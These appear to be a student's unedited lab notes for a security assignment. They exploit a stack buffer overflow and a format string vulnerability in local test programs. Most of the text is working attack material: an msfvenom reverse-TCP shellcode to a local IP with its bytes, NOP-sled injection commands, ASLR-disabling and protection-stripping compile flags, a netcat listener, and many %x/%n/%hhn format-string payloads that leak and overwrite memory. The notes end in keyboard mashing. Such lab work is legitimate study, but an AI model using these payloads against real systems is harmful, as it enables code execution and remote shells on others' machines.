run $(perl -e 'print"\x41"x104')

bufsize 35595108 = 16


![[Pasted image 20250821120722.png]]


0x000012ed
0x565562ed


run $(perl -e 'print"\x41"x20')

![[Pasted image 20250821121024.png]]


![[Pasted image 20250821121046.png]]


curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb >msfinstall && chmod 755 msfinstall && ./msfinstall


#### Steps
1. Disable address randomization
	sudo sysctl -w kernel.randomize_va_space=0
	sudo sysctl -w kernel.randomize_va_space=2

2. Compile using executable stack
	gcc -m32 -g -o stack -z execstack -fno-stack-protector stack.c

3. 

#### Payload Generation

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c
```
buf total = 68
```
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02"
"\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

```
run $(perl -e ’print "\x90"x40,"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\
x68\x2f\x2f\x73\x68\x68\x2f\x62\x 69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80\x90",
"\x04\xf2\xff\xbf"x40’)
```

run $(perl -e ’print "\x90"x40,"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\
x68\x2f\x2f\x73\x68\x68\x2f\x62\x 69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80\x90",
"\x04\xf2\xff\xbf"x40’)




run $(perl -e ’print "\x90"x20,"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",
"\x20\xcd\xff\xff"x20’)

ffffcd20 => "\x20\xcd\xff\xff"x40

```
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
```




run $(perl -e 'print "\x90"x20,"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",
"\x20\xcd\xff\xff"x20')


run $(perl -e 'print "\x90"x20')



run $(perl -e 'print "\x31\xdb\xf7\xe3\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",
"\x10\xcd\xff\xff"x20')


68/4 => 17 ada 60


davi@davi:~/Documents/Assignment/A1-Code$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02"
"\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";


![[Pasted image 20250823142835.png]]



run $(perl -e 'print "\x31\xdb\xf7\xe3\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')


![[Pasted image 20250823145255.png]]



```
nc -nv 10.0.2.15 4444
```



```
run $(perl -e 'print"\x90"x10,"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe1","\x20\xcd\xff\xff"x2')
``` 

run $(perl -e 'print"\x90"x10,"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe4","\x00\xcd\xff\xff"x2')



\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe4


#### Payload stage 1


"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe4"


cat step.bin | ./stack $(perl -e 'print "\x90"x10, "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe4", "\x00\xcd\xff\xff"')


run $(perl -e 'print "\x90"x10, "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe4", "\x20\xcd\xff\xff"')




perl -e 'print "\x90"x10, "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x03\xbb\x00\x00\x00\x00\x89\xe1\xba\x44\x00\x00\x00\xcd\x80\xff\xe4", "\x20\xcd\xff\xff"' > step1.bin        



#### Format String Vuln

AAAAAAAAA %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

![[Pasted image 20250828114855.png]]

suspicious about 55555592a0 -> 23rd arg

AAAAAAAAA %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s

![[Pasted image 20250828115354.png]]
we got F -> 1st char of secret, then we can just know in code, that malloc happen before secret allocations
![[Pasted image 20250828115428.png]]
so we got address ffffdc60 -> our secret address (pointer to secret)

we convert to little endian, `\x60\xdc\xff\xff` 
and generate the payload

echo $(printf "\x60\xdc\xff\xff").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s > input

55555592a0

23, 28, 29


%23$s
%28$s
%29$s

```
%x.%x.%s.%x.%x
```

35595108 % 26 -> 16, i use Q


gcc -m32 -fno-stack-protector -z execstack -g -o format_string format_string.c

```
$(printf "\x60\xdc\xff\xff")%62c%23$n
```

![[Pasted image 20250828114703.png]]



echo $(printf "\xb4\xa5\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%n > input
AAAAAAAAA %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x




%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
%5$x


0x56556209

1448435888

1448435892


565560b0


```
%x.%x.%x.%x.%x.%x.%x.%x.%x.%s.%x.%x

```
%x.%x.%x.%x.%x.%x.%x.%x.%s.%x.%x


%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

	%x.%x.%x.%x.%x.%x.%x.%x.%d.%x.%x

%x.%x.%x.%x.%x.%x.%x.%x.%n.%x.%x



0x56556209


```
1448436233
```


```
1448435888
```



%x.%x.%x.%x.%x.%x.%x.%s.%x.%x

| Number     | Hex      |
| ---------- | -------- |
| 1448435888 | 565560B0 |
| 1448435892 | 565560B4 |
| 1448435896 | 565560B8 |
| 1448435900 | 565560BC |
| 1448435904 | 565560C0 |
| 1448435908 | 565560C4 |
| 1448435912 | 565560C8 |


echo $(printf "\xb0\xa5\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%n > input



AAAAAAAAAAAAAAAAAAAA 1448435888 %x.%x.%x.%x.%x.%x.%x.%x.%s.%x

AAAAAAAAAAAAAAAAAAAA 1448436217 %x.%x.%x.%x.%x.%x.%x.%x.%s.%x



printf "\xb0\xa5\x55\x56".%x.%x.%x.%x.%x.%x.%x.%x.%s.%x


echo -ne "AAAAAAAAAAAAa\xb0\x60\x55\x56.%x.%x.%x.%x.%9\$s" > input



davi@davi:~/Documents/Assignment/A1-Code$ echo -ne "\xb0\x60\x55\x56%61x%8\$n" > input
davi@davi:~/Documents/Assignment/A1-Code$ ./format_string < input
Please enter a string:
Segmentation fault (core dumped)



echo -ne "\xb0\x60\x55\x56%61x%5\$n





python3 -c 'print("\xb0\xa5\x55\x56" + "AAAABBBBCCCC" + "%x.%x.%x.%x.%x.%x.%x.%x.%s")' > input


AAAABBBBCCCC 1448435888 %x.%x.%x.%x.%x.%x.%x.%x.%n


printf "AAAABBBBCCCCDDDDEEEE %x.%x.%x.%x.%x.%x.%x.%x.%x.%s" > input



%x.%x.%x.%x.%x.%x.%x.%x.%x.%10n



%x.%x.%x.%x.%x.%x.%x.%x.%n



	gcc -m32 -g -o format_string -z execstack -fno-stack-protector format_string.c


0x5655a1a0

0x5655A1AC


printf "\xa4\xa1\x55\x56%20c%n" > input


print ""


10


## REAL


![[Pasted image 20250827190042.png]]

echo $(printf "\xa4\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAA%n > input


echo $(printf "\xac\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAA%n > input

0x5655A1AC


echo $(printf "\xa4\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input

![[Pasted image 20250828201017.png]]

![[Pasted image 20250828201131.png]]

#### Payload 2.1
echo $(printf "\xa4\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input

##### Randomized address
echo %x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input

### WORKS
%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n

1448452524

%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n.%x

#### WORKS END

%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n

1448452512

%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n.%x

#### Payload 2.2
0x5655A1AC


perl -e 'print "\xa0\xa1\x55\x56\xac\xa1\x55\x56"' \
	   \.%x.%x.%x.%x.%x.%x.%x.%x.%x.\
       'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
       'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB' \
       '%hhn%hhn' > input

echo $(printf "\xa4\xa1\x55\x56\xac\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input
\xa4\xa1\x55\x56\xac\xa1\x55\x56


printf "\xa4\xa1\x55\x56".%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n

```
echo $(printf "\xa4\xa1\x55\x56\xb8\xa1\x55\x56%77c%1\\$hhn%9c%2\\$hhn") > input
```


perl -e 'print "\xa4\xa1\x55\x56\xb8\xa1\x55\x56%77c%1\$hhn%9c%2\$hhn"' > input


printf "\xa4\xa1\x55\x56".%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n


echo $(printf "\xac\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input


	gcc -m32 -g -o format_string -z execstack -fno-stack-protector format_string.c

secret[0]’s address is 0x5655a1a0 (on heap)
secret[1]’s address is 0x5655a1a4 (on heap)
secret[2]’s address is 0x5655a1a8 (on heap)
secret[3]’s address is 0x5655a1ac (on heap)


echo %x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n.%hhn.%x.%x.%x.%x.%x.%x.%x.%x.%x r> input


%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n



%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n

%s.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n

%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n
%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n
%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n
%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n
%x.%x.%x.%x.%x.%x.%x.%x.%s


echo %x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input


%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n

![[Pasted image 20250829002110.png]]
1448452524
1448452528
1448452516
1448452512



![[Pasted image 20250829002533.png]]
1448452512
%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n


test kalau misalkan dia itu cuma 1, 2, 3,4,5,6indoinseisneis;komasl;kmsksmalsmak